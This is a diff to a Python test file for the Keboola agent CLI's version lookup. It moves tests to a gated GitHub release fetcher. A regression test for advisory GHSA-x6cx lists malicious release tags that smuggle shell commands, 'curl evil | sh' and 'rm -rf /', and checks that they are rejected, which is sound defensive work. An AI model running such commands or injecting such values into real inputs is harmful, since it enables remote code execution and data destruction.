@@ -8,14 +8,15 @@ import pytest
 
 from keboola_agent_cli.frozen_dist import FrozenChannel, FrozenDistribution
 from keboola_agent_cli.services.version_service import (
+    GatedRelease,
     KbagentUpdatePlan,
     UpdatePlan,
     VersionService,
-    _fetch_kbagent_latest_version,
     _is_up_to_date,
     _recovery_command,
     build_hardlink_retry_command,
     build_kbagent_upgrade_command,
+    fetch_gated_release,
     get_update_timeout,
     prepare_kbagent_update_plan,
     resolve_kbagent_wheel_url,
@@ -24,6 +25,11 @@ from keboola_agent_cli.services.version_service import (
 from keboola_agent_cli.update_runner import DeferredUpdateRequest, InstallRun, InstallStatus
 
 VS = "keboola_agent_cli.services.version_service"
+
+
+def _gated(version: str | None) -> GatedRelease:
+    """A lookup result of the running major (the major gate is in test_major_gate.py)."""
+    return GatedRelease(latest_version=version, same_major_version=version)
 
 
 @pytest.fixture(autouse=True)
@@ -67,11 +73,11 @@ class TestVersionService:
     """Tests for VersionService.get_versions()."""
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_kbagent_entry(
         self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
     ) -> None:
-        mock_kbagent_latest.return_value = "9.9.9"
+        mock_kbagent_latest.return_value = _gated("9.9.9")
 
         result = VersionService().get_versions()
 
@@ -81,7 +87,7 @@ class TestVersionService:
         assert result["kbagent"]["upgrade_command"]
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_no_upgrade_command_when_local_is_ahead(
         self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
     ) -> None:
@@ -94,7 +100,7 @@ class TestVersionService:
         ``--force --reinstall`` command pinned to the OLDER stable wheel --
         running it silently downgrades off the beta.
         """
-        mock_kbagent_latest.return_value = "0.0.1"
+        mock_kbagent_latest.return_value = _gated("0.0.1")
 
         result = VersionService().get_versions()
 
@@ -102,7 +108,7 @@ class TestVersionService:
         assert result["kbagent"]["upgrade_command"] == ""
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_upgrade_command_absent_when_latest_unknown(
         self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
     ) -> None:
@@ -111,7 +117,7 @@ class TestVersionService:
         ``up_to_date`` is ``None`` there -- kbagent does not know whether an
         upgrade exists, so it cannot name a target to upgrade to.
         """
-        mock_kbagent_latest.return_value = None
+        mock_kbagent_latest.return_value = _gated(None)
 
         result = VersionService().get_versions()
 
@@ -119,7 +125,7 @@ class TestVersionService:
         assert result["kbagent"]["upgrade_command"] == ""
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_payload_carries_no_dependencies(
         self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
     ) -> None:
@@ -129,18 +135,18 @@ class TestVersionService:
         gone rather than left as an empty list -- consumers read
         ``result["kbagent"]`` and nothing else.
         """
-        mock_kbagent_latest.return_value = "9.9.9"
+        mock_kbagent_latest.return_value = _gated("9.9.9")
 
         result = VersionService().get_versions()
 
         assert set(result) == {"kbagent"}
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_remote_check_fails(
         self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
     ) -> None:
-        mock_kbagent_latest.return_value = None
+        mock_kbagent_latest.return_value = _gated(None)
 
         result = VersionService().get_versions()
 
@@ -148,7 +154,7 @@ class TestVersionService:
         assert result["kbagent"]["up_to_date"] is None  # cannot compare without latest
 
     @patch("keboola_agent_cli.auto_update._write_cache")
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_persists_freshly_fetched_versions_to_cache(
         self,
         mock_kbagent_latest: MagicMock,
@@ -165,7 +171,7 @@ class TestVersionService:
         answers to the same question; users got a kbagent older than what
         their version check claimed was newest.
         """
-        mock_kbagent_latest.return_value = "9.9.9"
+        mock_kbagent_latest.return_value = _gated("9.9.9")
 
         result = VersionService().get_versions()
 
@@ -178,7 +184,7 @@ class TestVersionService:
         assert result["kbagent"]["latest_version"] == "9.9.9"
 
     @patch("keboola_agent_cli.auto_update._write_cache", side_effect=OSError("disk full"))
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     def test_cache_write_failure_does_not_break_get_versions(
         self,
         mock_kbagent_latest: MagicMock,
@@ -187,7 +193,7 @@ class TestVersionService:
         """Cache write is best-effort: a write failure must NOT break the
         version command. The user sees the version info; the cache just
         won't be refreshed on this run."""
-        mock_kbagent_latest.return_value = "9.9.9"
+        mock_kbagent_latest.return_value = _gated("9.9.9")
 
         result = VersionService().get_versions()  # must NOT raise
 
@@ -203,14 +209,14 @@ class TestVersionService:
 class TestSelfUpdateSingleStage:
     """Tests for the kbagent self-upgrade path."""
 
-    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
+    @patch("keboola_agent_cli.services.version_service.fetch_gated_release")
     @patch("keboola_agent_cli.services.version_service.run_install")
     def test_up_to_date_runs_no_subprocess(
         self, mock_install: MagicMock, mock_kbagent_latest: MagicMock
     ) -> None:
         from keboola_agent_cli import __version__
 
-        mock_kbagent_latest.return_value = __version__
+        mock_kbagent_latest.return_value = _gated(__version__)
 
         result = VersionService().self_update()
 
@@ -227,7 +233,7 @@ class TestSelfUpdateSingleStage:
         events: list[str] = []
         mutated = False
 
-        def prepare(*, include_prerelease: bool = False) -> UpdatePlan:
+        def prepare(**_: object) -> UpdatePlan:
             events.append("prepare")
             return UpdatePlan(
                 kbagent=KbagentUpdatePlan(
@@ -349,34 +355,54 @@ class TestSelfUpdateDefersOnWindows:
         assert result["kbagent"]["recovery_command"] in result["kbagent"]["message"]
 
 
-class TestFetchKbagentLatestVersion:
-    """Beta / pre-release opt-in for kbagent version lookup (since v0.42.0)."""
+def _response(status: int, body: object = None) -> MagicMock:
+    response = MagicMock(status_code=status, headers={})
+    response.json.return_value = body
+    return response
+
+
+def _github(
+    latest_tag: str | None = None,
+    *tags: tuple[str, bool] | str,
+    drafts: tuple[str, ...] = (),
+):
+    """A fake ``httpx.get``: ``/releases/latest`` names ``latest_tag``; the list holds ``tags``.
+
+    A tuple in ``tags`` is (tag, prerelease). The ``v1.0.0`` tag answers 404.
+    """
+    entries = []
+    for item in tags:
+        tag, prerelease = (item, False) if isinstance(item, str) else item
+        entries.append({"tag_name": tag, "draft": False, "prerelease": prerelease})
+    entries += [{"tag_name": tag, "draft": True, "prerelease": False} for tag in drafts]
+
+    def get(url: str, **_: object) -> MagicMock:
+        if url.endswith("/releases/latest"):
+            return _response(200, {"tag_name": latest_tag, "draft": False, "prerelease": False})
+        if url.endswith("/releases"):
+            return _response(200, entries)
+        return _response(404)
+
+    return get
+
+
+class TestReleaseParsing:
+    """How the gate reads the release answers within the running major (0.x here)."""
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_default_uses_releases_latest_endpoint(self, mock_get: MagicMock) -> None:
-        """Without --beta: hit /releases/latest (GitHub filters prerelease)."""
-        mock_response = MagicMock()
-        mock_response.json.return_value = {"tag_name": "v0.42.0"}
-        mock_response.raise_for_status = MagicMock()
-        mock_get.return_value = mock_response
+    def test_stable_reads_releases_latest_not_the_list(self, mock_get: MagicMock) -> None:
+        mock_get.side_effect = _github("v0.42.0")
 
-        result = _fetch_kbagent_latest_version()
-
-        assert result == "0.42.0"
-        # Only one call, to /releases/latest -- the prerelease path uses
-        # /releases (plural) instead.
-        assert mock_get.call_count == 1
-        url = mock_get.call_args.args[0]
-        assert url.endswith("/releases/latest")
+        assert fetch_gated_release().latest_version == "0.42.0"
+        urls = [call.args[0] for call in mock_get.call_args_list]
+        assert urls[0].endswith("/releases/latest")
+        assert not any(url.endswith("/releases") for url in urls)
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
     def test_rejects_adversarial_release_tag(self, mock_get: MagicMock) -> None:
         """GHSA-x6cx: a tag whose valid version prefix is followed by garbage
         must be rejected. The old non-end-anchored ``re.match`` accepted it on
         the prefix, letting it flow into the upgrade command."""
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        mock_get.return_value = mock_response
         for bad in (
             "v0.99.0; curl evil | sh",
             "v0.99.0 && rm -rf /",
@@ -385,95 +411,47 @@ class TestFetchKbagentLatestVersion:
             "v0.99.0evil",
             "vgarbage",
         ):
-            mock_response.json.return_value = {"tag_name": bad}
-            assert _fetch_kbagent_latest_version() is None, bad
+            mock_get.side_effect = _github(bad)
+            assert fetch_gated_release().latest_version is None, bad
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_accepts_valid_stable_and_beta_tags(self, mock_get: MagicMock) -> None:
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        mock_get.return_value = mock_response
-        for tag, expected in (
-            ("v0.65.1", "0.65.1"),
-            ("v0.43.0b1", "0.43.0b1"),
-            ("0.65.2", "0.65.2"),
-        ):
-            mock_response.json.return_value = {"tag_name": tag}
-            assert _fetch_kbagent_latest_version() == expected, tag
+    def test_returns_the_canonical_pep440_form(self, mock_get: MagicMock) -> None:
+        for tag, expected in (("v0.65.1", "0.65.1"), ("0.65.2", "0.65.2")):
+            mock_get.side_effect = _github(tag)
+            assert fetch_gated_release().latest_version == expected, tag
+        mock_get.side_effect = _github(None, ("v0.43.0-beta.1", True))
+        assert fetch_gated_release(include_prerelease=True).latest_version == "0.43.0b1"
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
     def test_prerelease_returns_highest_pep440_version(self, mock_get: MagicMock) -> None:
-        """With include_prerelease=True: pick highest by PEP 440 ordering."""
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        # GitHub /releases returns newest-first, but the function must sort
-        # by SemVer/PEP 440, not by API order -- otherwise a hot-fix to an
-        # older release line (e.g. v0.41.11 after v0.42.0) would win.
-        mock_response.json.return_value = [
-            {"tag_name": "v0.41.11", "draft": False, "prerelease": False},
-            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
-            {"tag_name": "v0.43.0b1", "draft": False, "prerelease": True},
-            {"tag_name": "v0.43.0b2", "draft": False, "prerelease": True},
-        ]
-        mock_get.return_value = mock_response
+        """With include_prerelease=True: pick highest by PEP 440 ordering, not API order."""
+        mock_get.side_effect = _github(
+            None, "v0.41.11", "v0.42.0", ("v0.43.0b1", True), ("v0.43.0b2", True)
+        )
 
-        result = _fetch_kbagent_latest_version(include_prerelease=True)
-
-        assert result == "0.43.0b2"
-        # Plural /releases endpoint -- only one call.
-        url = mock_get.call_args.args[0]
-        assert url.endswith("/releases")
+        assert fetch_gated_release(include_prerelease=True).latest_version == "0.43.0b2"
+        assert mock_get.call_args_list[0].kwargs["params"] == {"per_page": 100}
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_prerelease_skips_drafts(self, mock_get: MagicMock) -> None:
-        """Draft releases must be ignored even when newest by tag."""
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        mock_response.json.return_value = [
-            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
-            {"tag_name": "v0.43.0b1", "draft": True, "prerelease": True},
-        ]
-        mock_get.return_value = mock_response
+    def test_skips_drafts(self, mock_get: MagicMock) -> None:
+        mock_get.side_effect = _github(None, "v0.42.0", drafts=("v0.43.0",))
 
-        result = _fetch_kbagent_latest_version(include_prerelease=True)
-
-        # Draft 0.43.0b1 skipped -> 0.42.0 wins.
-        assert result == "0.42.0"
+        assert fetch_gated_release(include_prerelease=True).latest_version == "0.42.0"
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_prerelease_falls_back_to_stable_when_no_betas(self, mock_get: MagicMock) -> None:
-        """When no pre-releases exist, the highest stable still wins."""
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        mock_response.json.return_value = [
-            {"tag_name": "v0.41.10", "draft": False, "prerelease": False},
-            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
-        ]
-        mock_get.return_value = mock_response
+    def test_ignores_invalid_tags(self, mock_get: MagicMock) -> None:
+        mock_get.side_effect = _github(None, ("vnext", True), "v0.42.0", ("wip", True))
 
-        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"
+        assert fetch_gated_release(include_prerelease=True).latest_version == "0.42.0"
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_prerelease_ignores_invalid_tags(self, mock_get: MagicMock) -> None:
-        """Hand-rolled tags that don't parse as PEP 440 are silently dropped."""
-        mock_response = MagicMock()
-        mock_response.raise_for_status = MagicMock()
-        mock_response.json.return_value = [
-            {"tag_name": "vnext", "draft": False, "prerelease": True},  # invalid
-            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
-            {"tag_name": "wip", "draft": False, "prerelease": True},  # invalid
-        ]
-        mock_get.return_value = mock_response
-
-        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"
-
-    @patch("keboola_agent_cli.services.version_service.httpx.get")
-    def test_prerelease_http_failure_returns_none(self, mock_get: MagicMock) -> None:
+    def test_http_failure_returns_none(self, mock_get: MagicMock) -> None:
         """Any httpx error returns None without crashing the caller."""
         import httpx
 
         mock_get.side_effect = httpx.HTTPError("upstream is down")
-        assert _fetch_kbagent_latest_version(include_prerelease=True) is None
+        assert fetch_gated_release().latest_version is None
+        assert fetch_gated_release(include_prerelease=True).latest_version is None
 
 
 class TestResolveKbagentWheelUrl:
@@ -1111,8 +1089,8 @@ class TestFrozenBuildVersionOutput:
     def _no_real_probes(self):
         with (
             patch(
-                "keboola_agent_cli.services.version_service._fetch_kbagent_latest_version",
-                return_value="99.0.0",
+                "keboola_agent_cli.services.version_service.fetch_gated_release",
+                return_value=_gated("99.0.0"),
             ),
             patch("keboola_agent_cli.auto_update._write_cache"),
         ):
